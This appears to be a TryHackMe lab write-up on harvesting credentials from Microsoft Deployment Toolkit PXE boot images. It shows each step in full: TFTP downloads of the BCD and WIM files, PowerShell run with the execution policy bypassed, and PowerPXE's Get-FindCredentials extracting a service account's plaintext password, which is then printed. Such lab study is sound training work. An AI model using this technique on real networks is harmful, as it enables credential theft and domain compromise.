# Microsoft Deployment Toolkit(MDT)
- MDT is used for updating workstation OS on the network without needing to configure every workstation, and other essential uses
- For this room we are only see Preboot Execution Environment (PXE) configuration.
- On going to (http://pxeboot.za.tryhackme.com/), found many `*.bcd` files, for this room we will focus only on `x64{4DD03F83-2453-49E5-859A-EAA1E0DE38EA}.bcd`

## Process
- Secure shelled to workstation on which we would like to add new OS.

```console
❯ ssh thm@THMJMP1.za.tryhackme.com
The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.24.248)' can't be established.
ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thmjmp1.za.tryhackme.com' (ED25519) to the list of known hosts.
thm@thmjmp1.za.tryhackme.com's password:

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

thm@THMJMP1 C:\Users\thm>cd Documents

```
- Made a new directory under Documents with username

```console
thm@THMJMP1 C:\Users\thm\Documents>mkdir divu050704
```

- Copied `powerpxe` [tool](https://github.com/wavestone-cdt/powerpxe) to this directory.

```console
thm@THMJMP1 C:\Users\thm\Documents>copy C:\powerpxe divu050704\
C:\powerpxe\LICENSE
C:\powerpxe\PowerPXE.ps1
C:\powerpxe\README.md
        3 file(s) copied.
thm@THMJMP1 C:\Users\thm\Documents>cd divu050704
thm@THMJMP1 C:\Users\thm\Documents\divu050704>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9
 Directory of C:\Users\thm\Documents\divu050704
11/09/2022  12:21 PM    <DIR>          .
11/09/2022  12:21 PM    <DIR>          ..
03/03/2022  08:54 PM             1,098 LICENSE
03/03/2022  08:54 PM            98,573 PowerPXE.ps1
03/03/2022  08:54 PM             2,144 README.md
               3 File(s)        101,815 bytes
               2 Dir(s)  49,312,903,168 bytes free
```
- Downloaded `*.bcd` file we talked about earlier as `conf.bcd`.

```console
thm@THMJMP1 C:\Users\thm\Documents\divu050704>tftp -i 10.200.24.202 GET "\Tmp\x64{4DD03F83-2453-49E5-859A-EAA1E0DE38EA}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s

```
- Started powershell with bypass `executionpolicy`

```console
thm@THMJMP1 C:\Users\thm\Documents\divu050704>powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\divu050704> ls


    Directory: C:\Users\thm\Documents\divu050704


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/9/2022  12:24 PM          12288 conf.bcd
-a----         3/3/2022   8:54 PM           1098 LICENSE
-a----         3/3/2022   8:54 PM          98573 PowerPXE.ps1
-a----         3/3/2022   8:54 PM           2144 README.md
```

- Imported module from `PowerPXE.ps1`
```console
PS C:\Users\thm\Documents\divu050704> Import-Module .\PowerPXE.ps1
```

- Got `wimfile` path for `conf.bcd`

```console
PS C:\Users\thm\Documents\divu050704> Get-WimFile -bcdFile .\conf.bcd
>> Parse the BCD file: .\conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

- Downloaded this `wimfile` as `pxboot.wim`

```console
PS C:\Users\thm\Documents\divu050704> tftp -i 10.200.24.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxboot.wim
Transfer successful: 341899611 bytes in 225 second(s), 1519553 bytes/s
```

- Searched for credentials in the `wimfile` 

```console
PS C:\Users\thm\Documents\divu050704> Get-FindCredentials -WimFile .\pxboot.wim
>> Open .\pxboot.wim
New-Item : An item with the specified name C:\Users\thm\Documents\divu050704\ already exists.
At C:\Users\thm\Documents\divu050704\PowerPXE.ps1:212 char:13
+     $null = New-Item -ItemType directory -Path $WimDir
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (C:\Users\thm\Documents\divu050704\:String) [New-Item], IOException
    + FullyQualifiedErrorId : DirectoryExist,Microsoft.PowerShell.Commands.NewItemCommand

>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

- Got password: `PXEBootSecure1@` for user: `svcMDT`
